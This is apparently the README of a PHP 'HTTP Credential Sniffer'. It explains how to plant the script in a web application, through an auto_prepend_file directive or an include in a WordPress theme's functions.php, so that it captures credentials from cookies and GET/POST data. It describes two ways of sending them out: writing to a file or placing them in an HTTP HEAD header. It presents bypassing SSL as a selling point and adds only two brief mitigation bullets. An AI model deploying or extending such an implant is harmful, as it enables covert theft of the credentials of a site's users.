# HTTP Credential Sniffer (for PHP Applications)

This is a simple script that will detect and log any credential communication over cookies and get/post requests and exfiltrate to somewhere. This method monitors data into application context/environment so cannot be defeated by the use of SSL.

## Installation / Deploy

Use the auto_prepend_file trick
```
php_value auto_prepend_file /var/www/path/to/hcs.php
```

Include into an important bootstrap file (like Wordpress' Themes function.php)
```php
include_once "hcs.php"
```

## Exfiltration Modes
* HCS_EXF_FILE -> Saves on a text file defined on 'HCS_EXF_FILE_FILENAME' constant (be sure to check file permissions!)
* HCS_EXF_HTTP_HEAD -> Issues an HTTP HEAD request via curl (requires php_curl) with X-HCS-Payload header containing the data (base64-encoded for compatibility, not evasion)

## Mitigation
* Use [OTP](http://en.wikipedia.org/wiki/One-time_password)
* Use Hash-based challenge-response authentication with [Nonces](http://en.wikipedia.org/wiki/Cryptographic_nonce) (dangerous if incorrectly implemented)

## To-do
* Add HTTP Auth support
